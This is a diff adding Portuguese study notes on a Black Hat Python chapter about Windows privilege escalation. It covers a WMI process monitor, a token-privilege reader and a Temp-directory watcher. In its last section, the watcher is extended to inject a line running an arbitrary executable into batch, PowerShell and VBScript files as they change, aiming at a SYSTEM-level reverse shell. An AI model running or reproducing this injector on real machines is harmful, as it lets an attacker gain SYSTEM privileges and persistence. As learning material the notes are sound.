@@ -188,3 +188,321 @@ Set objFile = objFSO.OpenTextFile("C:\Users\caioe\Documents\Projetos\BHPython\c1
 objFile.WriteLine "AHAHAHAHAHAHAHAAH - Executado em " & Now
 objFile.Close
 ```
+
+### Criando um monitor de processos
+
+Os autores, nessa parte do livro, falam brevemente sobre um monitor de processos, que usava DLLs, que um deles criou durante um pedido feito por uma empresa de segurança. Ele, depois de criá-lo, pensou em usá-lo de maneira ofensiva usando hooks para chamados de funções `CreateProcess` no Windows. 
+
+Contudo eles afirmaram que a maioria dos antivírus interceptam hooks para essas funções, tornando arriscado o uso dessa feature para a realização do nosso monitor de processos.
+
+Inspirados nisso, porém, usaremos algumas técnicas (sem hooks) para criar nosso próprio monitor de processos com a WMI.
+
+### Monitoramento de processos com a WMI
+
+A WMI fornece a capacidade de monitorar um sistema para eventos específicos e receber retornos quando eles ocorrem, algo similar ao feito anteriormente para os serviços. Usaremos ela para armazenar o horário que processos foram criados, o usuário responsável e o executável usado, bem como os argumentos da linha de comando, o ID do processo (PID) e o ID do processo-pai. 
+
+Isso nos permitirá identificar processos que chamem arquivos externos, VBScripts, batchs, etc. Usaremos a execução dos códigos a seguir como monitorador. Em `process_monitor.py`:
+
+```py
+# Importa módulos necessários para o funcionamento do código.
+import os               # Para operações de sistema relacionadas ao SO.
+import sys              # Para manipulação de argumentos e interação com o interpretador.
+import win32api         # Para interação com a API do Windows.
+import win32con         # Fornece constantes usadas em operações com a API do Windows.
+import win32security    # Para gerenciar e verificar permissões e privilégios.
+import wmi              # Biblioteca para interagir com o WMI (Windows Management Instrumentation).
+
+# Função para gravar mensagens em um arquivo de log.
+def log_to_file(message):
+    # 'a' indica que o arquivo será aberto em modo de adição, não sobrescrevendo o conteúdo existente.
+    with open('process_monitor_log.csv', 'a') as fd:
+        fd.write(f'{message}\r\n')  # Escreve a mensagem e adiciona uma nova linha no final.
+
+# Função principal que monitora a criação de processos.
+def monitor():
+    # Cabeçalho do arquivo de log, representando as informações que serão coletadas sobre os processos.
+    head = 'CommandLine, Time, Executable, Parent PID, PID, User, Privileges'
+    log_to_file(head)  # Registra o cabeçalho no arquivo de log.
+
+    # Cria um objeto para interagir com o WMI.
+    c = wmi.WMI()
+
+    # Configura um "watcher" para monitorar a criação de novos processos.
+    process_watcher = c.Win32_Process.watch_for('creation')
+
+    # Loop infinito para monitorar continuamente.
+    while True:
+        try:
+            # Aguarda e captura informações sobre o próximo processo criado.
+            new_process = process_watcher()
+
+            # Coleta informações do processo criado.
+            cmd_line = new_process.CommandLine          # Linha de comando usada para iniciar o processo.
+            create_date = new_process.CreationDate      # Data de criação do processo.
+            executable = new_process.ExecutablePath     # Caminho completo do executável.
+            parent_pid = new_process.ParentProcessId    # ID do processo pai.
+            pid = new_process.ProcessId                # ID do processo atual.
+            proc_owner = new_process.GetOwner()        # Propriedade que retorna o usuário que iniciou o processo.
+
+            # Privilegios são definidos como 'N/A', mas poderiam ser implementados.
+            privileges = 'N/A'
+
+            # Formata as informações do processo em uma mensagem de log.
+            process_log_message = (
+                f'{cmd_line}, {create_date}, {executable}, {parent_pid}, \
+                {pid}, {proc_owner}, {privileges}'
+            )
+
+            # Exibe as informações no console.
+            print(process_log_message)
+            print()
+
+            # Escreve as informações no arquivo de log.
+            log_to_file(process_log_message)
+
+        # Captura exceções e ignora erros durante o monitoramento.
+        except Exception:
+            pass
+
+# Ponto de entrada do script.
+if __name__ == '__main__':
+    # Inicia a função de monitoramento.
+    monitor()
+```
+
+### Explorando o código
+
+Ao explorar o código, em um terminal de Administrador, tudo correu bem.
+
+### Privilégios de token do Windows
+
+Vamos preencher o capo de privilégios (`privileges`), mas, antes disso, vamos entender um pouco como funcionam os privilégios do Windows.
+
+De acordo com a Microsoft, um [token de acesso windows](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-tokens) é um "objeto que descreve o contexto de segurança de um processo ou thread". Os tokens de maior liberdade são os que mexem diretamente com o Windows em si (drivers). Os desenvolvedores utilizam, em alguns casos, métodos que levam ao escalonamento de privilégios Windows. Um exemplo citado é a chamada da função da API do Windows `AdjustTokenPrivileges`, que possui o privilégio `SeLoadDriver`. Nesse caso, se conseguirmos acessar essa aplicação, teremos acesso para instalar qualquer driver desejado, nos dando praticamente privilégios de Kernel ser usarmos um rootkit, por exemplo.
+
+Caso não se consiga executar o monitor de processos como SYSTEM ou como Administrador, é preciso se atentar aos processos que você consegue monitorar. Existem alguns privilégios importantes, os autores listam três, mas você pode achar todos neste [link](https://learn.microsoft.com/pt-br/windows/win32/secauthz/privilege-constants):
+
+| Nome do Privilégio     | Acesso Concedido                                                                                  |
+|------------------------|--------------------------------------------------------------------------------------------------|
+| SeBackupPrivilege      | Permite que o processo do usuário faça backup de arquivos e diretórios, concedendo acesso de leitura independentemente do que a lista de controle de acesso (ACL) define. |
+| SeDebugPrivilege       | Permite que o processo do usuário depure outros processos, incluindo a obtenção de handles de processos para injetar DLLs ou código em processos em execução.             |
+| SeLoadDriver           | Permite que um processo de usuário carregue ou descarregue drivers.                                                                   |
+
+
+Sabemos então quais processos procurar. Usaremos o Python para achar os privilégios habilitados nos processos que estamos procurando. Vamos criar a função `get_process_privileges`:
+
+```py
+def get_process_privileges(pid):
+    try:
+        # Abre o processo com a permissão de consulta de informações.
+        hproc = win32api.OpenProcess(
+            win32con.PROCESS_QUERY_INFORMATION,  # Permissão para consultar informações do processo.
+            False,                              # Não herda identificadores.
+            pid                                 # ID do processo alvo.
+        )
+        
+        # Obtém o token de acesso associado ao processo.
+        htok = win32security.OpenProcessToken(
+            hproc, 
+            win32con.TOKEN_QUERY               # Permissão para consultar o token.
+        )
+        
+        # Obtém informações de privilégios do token.
+        privs = win32security.GetTokenInformation(
+            htok, 
+            win32security.TokenPrivileges      # Tipo de informação: privilégios.
+        )
+        
+        # Inicializa a string que armazenará os privilégios habilitados.
+        privileges = ''
+        
+        # Itera sobre os privilégios retornados.
+        for priv_id, flags in privs:
+            # Verifica se o privilégio está habilitado ou habilitado por padrão.
+            if flags == (win32security.SE_PRIVILEGE_ENABLED |
+                         win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT):
+                # Converte o ID do privilégio para seu nome legível e o adiciona à lista.
+                privileges += f'{win32security.LookupPrivilegeName(None, priv_id)}|'
+                
+    except Exception:
+        # Em caso de erro, define os privilégios como 'N/A'.
+        privileges = 'N/A'
+    
+    # Retorna a lista de privilégios como uma string (separada por "|").
+    return privileges
+
+
+.......................
+def monitor():
+
+    ........
+
+        privileges = get_process_privileges(pid)
+```
+
+Pronto! Agora temos um método de buscar os privilégios por nome em cada processo criado. Nos falta então criar uma lógica para usá-los.
+
+### Vencendo a corrida
+
+Os autores afirmam que, via de regra, existem scripts que são acionados rotineiramente pelo sistema para executar tarefas. Contudo, assim como o exemplo do início co capítulo, esses scripts são salvos em um arquivo temporário, executados e em seguida deletados. Queremos vencer essa corrida de execução de arquivos para colocarmos nossos próprios scripts e, para isso, usaremos a API do Windows `ReadDirectoryChangesW`, para monitorar a escrita de novos arquivos em determinado diretório. Em `file_monitor.py`:
+
+```py
+import os             # Para operações com arquivos e caminhos.
+import tempfile       # Para manipular diretórios temporários.
+import threading      # Para criar e gerenciar threads.
+import win32con       # Para usar constantes da API do Windows.
+import win32file      # Para manipulação de arquivos e diretórios no Windows.
+
+# Constantes que representam ações em arquivos/diretórios.
+FILE_CREATED = 1         # Arquivo criado.
+FILE_DELETED = 2         # Arquivo excluído.
+FILE_MODIFIED = 3        # Arquivo modificado.
+FILE_RENAMED_FROM = 4    # Arquivo renomeado (antes).
+FILE_RENAMED_TO = 5      # Arquivo renomeado (depois).
+
+# Permissão necessária para monitorar o diretório.
+FILE_LIST_DIRECTORY = 0x0001
+
+# Lista de diretórios a serem monitorados.
+PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]  # Diretório TEMP do sistema e TEMP do usuário.
+
+# Função para monitorar alterações em um diretório específico.
+def monitor(path_to_watch):
+    # Abre o diretório para monitoramento usando a API do Windows.
+    h_directory = win32file.CreateFile(
+        path_to_watch,  # Caminho do diretório a ser monitorado.
+        FILE_LIST_DIRECTORY,  # Permissão para listar diretórios.
+        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, 
+        None,  # Sem segurança adicional.
+        win32con.OPEN_EXISTING,  # Não criar um novo arquivo/diretório, apenas acessar o existente.
+        win32con.FILE_FLAG_BACKUP_SEMANTICS,  # Permissão necessária para operar em diretórios.
+        None
+    )
+    
+    # Loop infinito para monitorar continuamente o diretório.
+    while True:
+        try:
+            # Obtém mudanças no diretório.
+            results = win32file.ReadDirectoryChangesW(
+                h_directory,  # Identificador do diretório.
+                1024,         # Tamanho do buffer (1 KB).
+                True,         # Monitorar alterações em subdiretórios.
+                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
+                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
+                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
+                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
+                win32con.FILE_NOTIFY_CHANGE_SECURITY |
+                win32con.FILE_NOTIFY_CHANGE_SIZE,
+                None,         # Sobreposição não usada.
+                None          # Estrutura de retorno não usada.
+            )
+            
+            # Processa as alterações detectadas.
+            for action, file_name in results:
+                # Cria o caminho completo do arquivo alterado.
+                full_filename = os.path.join(path_to_watch, file_name)
+                
+                # Identifica a ação realizada e imprime mensagens no console.
+                if action == FILE_CREATED:
+                    print(f'[+] {full_filename} criado')
+                elif action == FILE_DELETED:
+                    print(f'[-] {full_filename} excluído')
+                elif action == FILE_MODIFIED:
+                    print(f'[*] {full_filename} modificado')
+                    try:
+                        print('[vvv] Extraindo conteúdo...')
+                        # Tenta abrir e ler o conteúdo do arquivo modificado.
+                        with open(full_filename) as f:
+                            contents = f.read()
+                        print(contents)  # Exibe o conteúdo do arquivo.
+                        print('[^^^] Extração concluída')
+                    except Exception as e:
+                        print(f'[!!] Falha na extração: {e}')  # Captura erros ao abrir o arquivo.
+                elif action == FILE_RENAMED_FROM:
+                    print(f'[>] Renomeado de {full_filename}')
+                elif action == FILE_RENAMED_TO:
+                    print(f'[<] Renomeado para {full_filename}')
+                else:
+                    print(f'[?] Ação desconhecida para {full_filename}')
+        
+        # Captura e ignora exceções, permitindo que o monitoramento continue.
+        except Exception:
+            pass
+
+# Ponto de entrada do script.
+if __name__ == '__main__':
+    # Inicia uma thread separada para monitorar cada diretório da lista.
+    for path in PATHS:
+        monitor_thread = threading.Thread(target=monitor, args=(path, ))
+        monitor_thread.start()
+```
+
+Boa! Agora temos um monitor de diretórios bem estruturado. Você pode testar criando arquivos em diretórios que estão nos PATHs.
+
+### Injeção de código
+
+Vamos agora adaptar nosso código para executar executáveis abritrários quando o arquivo é modificado. Os autores, no livro, exemplificam ao criar um executável do `netcat.py` criado nos primeiros capítulos. Não seguirei esse processo de criar um executável como eles fizeram pois priorizarei o código.
+
+Vamos adaptar nosso `file_monitor.py` para que ele crie um [shell de comando reverso](https://www.checkpoint.com/pt/cyber-hub/cyber-security/what-is-cyber-attack/what-is-a-reverse-shell-attack/):
+
+```py
+# Adicionaremos as seguintes constantes ao nosso arquivo python
+# Local do executável que usaremos
+EXEC_PATH = 'C:\\Users\\caioe\\Documents\\Projetos\\BHPython\\c10\\codigos\\hello_world\\dist\\hello_world.exe' 
+# Os argumentos a serem colocados
+ARGS = ''
+# O comando completo de execução
+CMD = f'{EXEC_PATH} {ARGS}'
+
+# Aqui foi criada uma matriz para, dependendo do tipo de arquivo que foi modificado (executáveis), seja adicionada uma nova linha que
+# execute o nosso CMD
+
+# Note que há um título para cada execução ("bhmaker")
+FILE_TYPES = {
+    '.bat': ["\r\nREM bhpmaker\r\n", f'\r\n{CMD}\r\n'],
+    '.ps1': ["\r\n#bhpmaker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+    '.vbs': ["\r\n'bhpmaker\r\n",
+             f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n']
+}
+
+# Aqui, na função inject_code(), é recebido o nome do arquivo, o seu conteúdo e a sua extensão
+def inject_code(full_filename, contents, extension):
+    if FILE_TYPES[extension][0].strip() in contents: # Se o "titulo" da nossa injeção já está no conteúdo, não fazemos nada
+        return
+    
+    # Caso contrário, excrevemos nossa execução
+    full_contents = FILE_TYPES[extension][0]
+    full_contents += FILE_TYPES[extension][1]
+    full_contents += contents
+    
+    with open(full_filename, 'w') as f:
+        f.write(full_contents)
+    print('\\o/ Codigo Injetado!')  # mensagem de retorno de sucesso
+
+..............
+
+def monitor(path_to_watch)
+
+........
+        # Modificamos o montior para que, quando o arquivo for modificado (evitando suspeitas), nós verificamos a extensão
+            elif action == FILE_MODIFIED:
+                    extension = os.path.splitext(full_filename)[1]
+                    if extension in FILE_TYPES: # Se a extensão estiver nas que desejamos monitorar, 
+                                                # tentamos ler o arquivo e injetar código
+                            print(f'[*] {full_filename} modificado')
+                            print('[vvv] Extraindo conteudo...')
+                            try:
+                                with open(full_filename) as f:
+                                    contents = f.read()
+                                inject_code(full_filename, contents, extension)     # trecho de injeção
+                                print(contents)
+                                print('[^^^] Extracao concluida')
+                            except Exception as e:
+                                print(f'[!!] Falha na extracao: {e}')
+```
+
+Agora temos uma forma de injetar código em rotinas arbitrariamente!
+
+### Explorando código
+
+Os autores usam o exemplo do nosso `netcat` pois nele temos uma interface de linha de comando remota. É possível deixar o usuário com permissão de SYSTEM devido aos privilégios da execução da nossa rotina!
